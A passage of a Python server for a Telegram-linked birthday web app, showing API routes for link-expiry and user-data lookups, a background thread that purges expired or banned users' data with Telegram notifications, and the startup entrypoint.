                "bot_configured": bool(BOT_TOKEN and "YOUR" not in BOT_TOKEN),
                "total_answers_saved": len(config.get("saved_answers", [])),
                "web_app_url": config.get("web_app_url")
            }).encode("utf-8"))
            return

        elif self.path.startswith("/api/check_link_status"):
            import urllib.parse as up
            qs = up.parse_qs(self.path.split("?", 1)[1] if "?" in self.path else "")
            username_key = qs.get("username", [""])[0].lower().strip()
            exp_param = qs.get("exp", [""])[0].strip()

            now_ms = time.time() * 1000.0
            is_expired = False
            exp_ts = 0

            if exp_param:
                try:
                    exp_ts = float(exp_param)
                    is_expired = now_ms >= exp_ts
                except Exception:
                    pass

            if not is_expired and username_key:
                user_exp = config.get("link_expiries", {}).get(username_key, {})
                if user_exp:
                    exp_ts = user_exp.get("expires_at", 0)
                    is_expired = now_ms >= exp_ts

            time_left_sec = max(0, int((exp_ts - now_ms) / 1000)) if exp_ts else 0

            self.send_response(200)
            self._set_cors()
            self.send_header("Content-Type", "application/json")
            self.end_headers()
            self.wfile.write(json.dumps({
                "status": "success",
                "is_expired": is_expired,
                "expires_at": exp_ts,
                "time_left_seconds": time_left_sec
            }).encode("utf-8"))
            return

        elif self.path.startswith("/api/get_user_data"):
            import urllib.parse as up
            qs = up.parse_qs(self.path.split("?", 1)[1] if "?" in self.path else "")
            username_key = qs.get("username", [""])[0].lower().strip()
            user_data = config.get("portal_user_data", {}).get(username_key, {})
            portal_users = config.get("birthday_portal_users", {})
            is_existing = username_key in portal_users

            # Check if user is banned (in scheduled_deletions with future delete_at)
            is_banned = any(
                d.get("username") == username_key and d.get("delete_at", 0) > time.time()
                for d in config.get("scheduled_deletions", [])
            )

            # Check if user link is 48-hr expired
            link_exp = config.get("link_expiries", {}).get(username_key, {})
            link_expired = False
            if link_exp and (time.time() * 1000.0 >= link_exp.get("expires_at", 0)):
                link_expired = True

            self.send_response(200)
            self._set_cors()
            self.send_header("Content-Type", "application/json")
            self.end_headers()
            self.wfile.write(json.dumps({
                "status": "success",
                "is_existing_user": is_existing,
                "is_banned": is_banned,
                "link_expired": link_expired,
                "user_data": user_data
            }).encode("utf-8"))
            return

        self.send_response(200)
        self._set_cors()
        self.send_header("Content-Type", "text/html; charset=utf-8")
        self.end_headers()
        html = f"""
        <html>
        <body style="font-family:sans-serif; background:#12030f; color:#fff; padding:40px; text-align:center;">
          <h1 style="color:#ff758c;">🤖 Birthday Telegram Sync Server is Running!</h1>
          <p>Status: Active on port {config.get('api_port', 5000)}</p>
          <p>Bot Token Configured: {'✅ YES' if BOT_TOKEN and 'YOUR' not in BOT_TOKEN else '⚠️ Placeholder Token'}</p>
        </body>
        </html>
        """
        self.wfile.write(html.encode("utf-8"))

def cleanup_scheduled_deletions():
    """Runs every 60 seconds, permanently removes users whose 48hr link or 24hr deletion has expired"""
    while True:
        time.sleep(60)  # Check every 1 minute
        try:
            cfg = load_config()
            now = time.time()
            now_ms = now * 1000.0
            changes_made = False

            # 1. Check 48-Hour Link Expiries -> Auto-wipe user data permanently
            link_expiries = cfg.get("link_expiries", {})
            users_db = cfg.get("birthday_portal_users", {})
            portal_data = cfg.get("portal_user_data", {})
            active_links = {}

            for uname, ldata in link_expiries.items():
                exp_ts = ldata.get("expires_at", 0)
                if exp_ts and now_ms >= exp_ts:
                    # 48 Hours has passed! Permanently purge user data
                    if uname in users_db:
                        del users_db[uname]
                        changes_made = True
                    if uname in portal_data:
                        del portal_data[uname]
                        changes_made = True

                    # Notify Telegram
                    owner_id = cfg.get("owner_chat_id", "")
                    if BOT_TOKEN and "YOUR_TELEGRAM" not in BOT_TOKEN and owner_id:
                        try:
                            msg = (
                                f"⏰ <b>48-HOUR SURPRISE LINK EXPIRED & PERMANENTLY DELETED</b>\n\n"
                                f"• <b>Username:</b> <code>{uname}</code>\n"
                                f"• <b>Status:</b> 48 hours completed since link generation.\n"
                                f"• <b>Purged:</b> Photos, wishes, URLs, and account credentials permanently erased from Telegram and server. ✅"
                            )
                            requests.post(f"{BASE_TG_URL}/sendMessage", json={
                                "chat_id": owner_id,
                                "text": msg,
                                "parse_mode": "HTML"
                            }, timeout=8)
                        except Exception:
                            pass
                else:
                    active_links[uname] = ldata

            if len(active_links) != len(link_expiries):
                cfg["link_expiries"] = active_links
                changes_made = True

            # 2. Check 48-72h Idle Registered Users who NEVER generated a link
            registered_stamps = cfg.get("registered_portal_timestamps", {})
            active_stamps = {}
            idle_timeout_sec = 72 * 3600  # 72 hours (between 48 to 72 hours)

            for uname, reg_time in registered_stamps.items():
                if uname not in active_links and (now - reg_time) >= idle_timeout_sec:
                    # 72h passed without generating a link -> Purge
                    if uname in users_db:
                        del users_db[uname]
                        changes_made = True
                    if uname in portal_data:
                        del portal_data[uname]
                        changes_made = True

                    owner_id = cfg.get("owner_chat_id", "")
                    if BOT_TOKEN and "YOUR_TELEGRAM" not in BOT_TOKEN and owner_id:
                        try:
                            msg = (
                                f"⏰ <b>IDLE USER DATA DELETED (72 HOURS)</b>\n\n"
                                f"• <b>Username:</b> <code>{uname}</code>\n"
                                f"• <b>Reason:</b> No link was generated within 48 to 72 hours.\n"
                                f"• Account data has been permanently deleted from server. ✅"
                            )
                            requests.post(f"{BASE_TG_URL}/sendMessage", json={
                                "chat_id": owner_id,
                                "text": msg,
                                "parse_mode": "HTML"
                            }, timeout=8)
                        except Exception:
                            pass
                else:
                    active_stamps[uname] = reg_time

            if len(active_stamps) != len(registered_stamps):
                cfg["registered_portal_timestamps"] = active_stamps
                changes_made = True

            # 3. Check Manual Scheduled Deletions (24h ban)
            pending = cfg.get("scheduled_deletions", [])
            still_pending = []

            for d in pending:
                if d.get("delete_at", 0) <= now:
                    uname = d.get("username", "")
                    if uname in users_db:
                        del users_db[uname]
                        changes_made = True

                    tg_chat_id = d.get("tg_chat_id", "") or cfg.get("owner_chat_id", "")
                    if BOT_TOKEN and "YOUR_TELEGRAM" not in BOT_TOKEN and tg_chat_id:
                        try:
                            msg = (
                                f"🗑️ <b>PERMANENT DELETION COMPLETE</b>\n\n"
                                f"• <b>Username:</b> <code>{uname}</code>\n"
                                f"• <b>Status:</b> Account permanently deleted ✅\n"
                                f"• <b>Time:</b> {time.strftime('%d %b %Y, %I:%M %p')}\n\n"
                                f"This user can no longer login to the Birthday Portal."
                            )
                            requests.post(f"{BASE_TG_URL}/sendMessage", json={
                                "chat_id": tg_chat_id,
                                "text": msg,
                                "parse_mode": "HTML"
                            }, timeout=8)
                        except Exception:
                            pass
                else:
                    still_pending.append(d)

            if len(still_pending) != len(pending):
                cfg["scheduled_deletions"] = still_pending
                changes_made = True

            if changes_made:
                cfg["birthday_portal_users"] = users_db
                cfg["portal_user_data"] = portal_data
                save_config(cfg)

        except Exception as e:
            print(f"[Cleanup Error]: {e}")


def start_api_server(port=5000):
    server = HTTPServer(("0.0.0.0", port), WebhookHandler)
    print(f"🚀 Birthday Webhook API Server running on http://localhost:{port}")
    server.serve_forever()

# =========================================================
# MAIN ENTRYPOINT
# =========================================================
if __name__ == "__main__":
    print("=" * 60)
    print("✨ 3D Birthday Celebration - Telegram Bot & Sync Server")
    print("=" * 60)
    print(f"• Config file: {CONFIG_FILE}")
    print(f"• Web App URL: {config.get('web_app_url')}")
    print(f"• API Port: {config.get('api_port', 5000)}")

    if not BOT_TOKEN or "YOUR_TELEGRAM_BOT_TOKEN" in BOT_TOKEN:
        print("\n⚠️ NOTE: Bot Token is currently placeholder.")
        print("👉 Please edit `bot_config.json` with your real Telegram Bot Token from @BotFather")
        print("👉 Or send commands via the web app / local API.\n")

    # Start HTTP API server in background thread
    api_thread = threading.Thread(target=start_api_server, args=(config.get("api_port", 5000),), daemon=True)
    api_thread.start()

    # Start scheduled deletion cleanup thread (runs every 60s)
    cleanup_thread = threading.Thread(target=cleanup_scheduled_deletions, daemon=True)
    cleanup_thread.start()

    # Configure Telegram 3-line burger menu commands
    setup_telegram_menu()

    # Run Telegram Bot Polling in main thread
    handle_updates()
